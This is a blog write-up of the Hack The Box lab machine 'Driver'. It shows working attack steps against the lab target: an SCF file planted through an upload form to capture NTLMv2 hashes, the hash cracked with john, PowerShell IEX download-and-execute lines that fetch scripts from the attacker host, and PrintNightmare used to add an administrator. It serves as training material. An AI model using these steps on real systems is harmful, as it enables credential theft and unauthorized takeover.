---
layout: post
title:  "Driver Writeup - Hack The Box"
date:   2023-12-08
desc: "SCF Malicious File, PrintNightmare LPE (PowerShell)"
keywords: "HTB,OSCP,eJPT,Easy,Windows,SCF,PrintNightmare"
categories: [HTB]
tags: [HTB,OSCP,eJPT,Windows,SCF,PrintNightmare,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I am back to my task of becoming a better professional in the field of computer security. To do so, I must face labs and challenges that will help me improve my **skills** and broaden my **knowledge**. Machines with a **Windows OS** represent me a great satisfaction every time I hack them, because I have very little practice with them, the [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Driver** is easy but as always, I must take every opportunity to learn something new or strengthen my instincts in vulnerability research. Here I go!

<br/><br/>
<img src="{{ site.img_path }}/driver_writeup/Driver.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

It has already become part of my work methodology, to start in an orderly way every time I face a **Hack The Box**, I usually deploy the machine from my terminal with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** to avoid wasting time accessing it from the web. With `nmap`, I first get the exposed ports on the victim machine and then I get the services and versions with the `lua` scripts it has. In a first approach, I see that I can look for **bugs** in the **SMB** or **HTTP** protocol, it also has the **Windown Remote Management (WinRM)** open.

```bash
./htbExplorer -d Driver
```

> **WinRM (Windows Remote Management)** is Microsoft's implementation of **WS-Management** in Windows which allows systems to access or exchange management information across a common network. Utilizing scripting objects or the built-in command-line tool, **WinRM** can be used with any remote computers that may have baseboard management controllers (**BMCs**) to acquire data. On Windows-based computers including **WinRM**, certain data supplied by **Windows Management Instrumentation** (**WMI**) can also be obtained.

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.106 -oG allPorts
nmap -sCV -p80,135,445,5985 10.10.11.106 -oN targeted

cat targeted
```
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

If I try to enumerate shares with **SMB**, I have no privileges to do so. With `crackmapexec` I can also know that it is not signed, if I don't find any other vulnerability, I can investigate some way to exploit this misconfiguration. The **HTTP** service exposed on port **80** is the next attack vector I can think of, with `whatweb` I see the technologies it uses and also access from the browser, it has an authentication panel to access.

> **SMB signing disabled vulnerability** is a security vulnerability that allows an attacker to bypass SMB signing and modify the data in transit. This vulnerability can be exploited by attackers to gain unauthorized access to sensitive information or to carry out other malicious activities

```bash
smbclient -L 10.10.11.106 -N                  # :(
smbmap -H 10.10.11.106 -u 'null'              # :(
poetry run crackmapexec smb 10.10.11.106

whatweb http://10.10.11.106

echo 'oldboy' > test.txt
```

<br/><br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

I always try with default credentials, such as **admin:admin**, **admin:password**, **guest:guest**, etc. In this case one worked and I could access the web service, many of the functionalities are not developed except **Firmware Updates**, which allows me to upload a file, but I test with a `.txt` file and it doesn't report any error. So I think this is a possible attack vector to be able to perform actions that allow me to access the machine.

<br/><br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

Since I have the ability to upload files, I am going to search the internet (**mfp firmware update center exploit**) for a way to upload a malicious file and get some information from the machine. The search engine suggests and autocompletes the search with **scf malicious file**, and I find a very good resource, **[SMB Share – SCF File Attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/){:target="_blank"}**, which explains that by uploading a malicious file (it also gives me an example), I can perform several actions, including obtaining the hashes of Windows users. So I try to upload the file and create a local server with `impacket`, and in a second I get a **NTLMv2** Hash that I can try to crack with `john`.

> **SCF** stands for **Shell Command File** and is a file format that supports a very limited set of Windows Explorer commands, such as opening a Windows Explorer window or showing the Desktop. The "Show Desktop" shortcut we all use on a daily basis is an SCF file.

```bash
nvim oldboy.scf
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **oldboy.scf**

```powershell
[Shell]
Command=2
IconFile=\\10.10.14.15\smbFolder\oldboy.ico
[Taskbar]
Command=ToggleDesktop
```

<br/><br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I already have a Hash, if it is weak password, then I will have no problem with cracking it with `john`. It doesn't take long and I get the credentials, which I validate with `crackmapexec`. As the machine has **WinRM** active, I use `evil-winrm` and connect to the box. Now I check that I have access to the first flag, and the first phase is completed, it's time to perform a **user-pivoting** or a **privilege escalation**.

```bash
vi hashNTLMV2.driver
john -w:/usr/share/wordlists/rockyou.txt hashNTLMV2.driver

# Validate username & password
poetry run crackmapexec smb 10.10.11.106 -u 'tony' -p '....'        # :)
poerty run winrm 10.10.11.106 -u 'tony' -p '....'                   # :)

evil-winrm -i 10.10.11.106 -u 'tony' -p '....'
```

> **Evil-winrm** tool is originally written by the team **Hackplayers**. The purpose of this tool is to make penetration testing easy as possible especially in the Microsoft Windows environment. **Evil-winrm** works with PowerShell remoting protocol (PSRP).

```powershell
whoami
hostname
```

<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use some basic commands in `powershell`, to get information about the privileges that the user I am logged in with has, I only find that he belongs to the **Remote Management Users** Group. So it might be a good idea to employ the script **[`PowerUp.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1){:target="_blank"}**, to find common vectors to escalate privileges, I also edit it to run its module once uploaded, I do this to avoid some steps. But I have problems uploading it to the archive, maybe there is a firewall that is recognizing it as malicious.

> **[PowerSploit](https://github.com/PowerShellMafia/PowerSploit){:target="_blank"}** is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.

> **PowerUp** aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

```powershell
ifconfig
whoami /priv
whoami /all

net user tony               # --> Remote Management User
systeminfo                  # --> Access denied!
```

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1

nvim PowerUp.ps1
# Add Invoke-AllChecks to the end of the script

python3 -m http.server 80
```

> **Victime Machine**:

```powershell
wget http://10.10.14.15/PowerUp.ps1
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerUp.ps1')
```

<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

Another powerful enumeration tool is **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS){:target="_blank"}**, but first I am going to do an internet search to find out the architecture of the operating system (**current version windows registry key read command line**), I find a resource with what I need, **[How to find the Windows version using Registry?](https://mivilisnet.wordpress.com/2020/02/04/how-to-find-the-windows-version-using-registry/){:target="_blank"}** and I can download the version of **winPEAS** that will work. I download it on the victim machine and run it, one must be patient and not get lost among so much information, but I find that the `spoolsv` service is running, and I remember that the web service on port **80** is related to the printer firmware management, so it seems that this is the most likely attack vector.

> **`spoolsv.exe`** runs the Windows OS print spooler service. Any time you print something with Windows this important service caches the print job into memory so your printer can understand what to print.

> **Victime Machine**:

```powershell
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
```

> **Attacker Machine**:

```bash
mv ~/Downloads/winPEASx64.exe winPEAS.exe
```
> **Victime Machine**:

```powershell
upload /home/al3j0/Documents/HackTheBox/Driver/content/winPEAS.exe

.\winPEAS.exe
# --> Current TPC Listening Ports --> spoolsv
```

<br/><br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

If I search for an exploit for this service (**spoolsv exploit github**), I find several resources, so I'm going to try the **[CVE-2021-1675 - PrintNightmare LPE (PowerShell)](https://github.com/calebstewart/CVE-2021-1675){:target="_blank"}** one. The exploit takes advantage of a critical vulnerability that can be read in more detail in the **[CVE-2021-1675](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675){:target="_blank"}**. If I download the script on the attacker machine and upload it to the victim machine, I can check that before executing it, there is only the user `administrator` in the **Administrators** group, but after its execution, I see a new user that the exploit created. I check with `crackmapexec` that the user and his password are valid, and it also informs me that the machine is **Pwn3d!**. So I just have to connect with `evil-winrm` and access the last flag. Box routed!

> **CVE-2021-1675** is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."

> **Attacker Machine**

```bash
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
python3 -m http.server 80
```

> **Attacker Machine**:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/CVE-2021-1675.ps1')

net user                                    # oldboy don't exist!
net localgroup administrators

Invoke-Nightmare -DriverName "Xerox" -NewUser "oldboy" -NewPassword "oldboy123!$"

net user                                    # oldboy <-- There it is!
net localgroup administrators
```

> **Attacker Machine**:

```bash
poetry run crackmapexec smb 10.10.11.106 -u 'oldboy' -p 'oldboy123!$'            # --> (Pwn3d!)
poetry run winrm 10.10.11.106 -u 'oldboy' -p 'oldboy123!$'                       # --> (Pwn3d!)

evil-winrm -i 10.10.11.106 -u 'oldboy' -p 'oldboy123!$'
```

<br/><br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/driver_writeup/Driver_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> As I have always said, what a great satisfaction it is to learn and understand the concepts, they fill you with energy to continue advancing and progressing in the complexity of the challenges, these **Hack The Box** machines may seem easy but for one who is just starting they are a great contribution to our knowledge. Now I can increase the level of complexity a bit and move on to the next box. I kill the machine with **`htbExplorer`** and I'm already looking forward to deploy one more.

```bash
./htbExplorer -k Driver
```
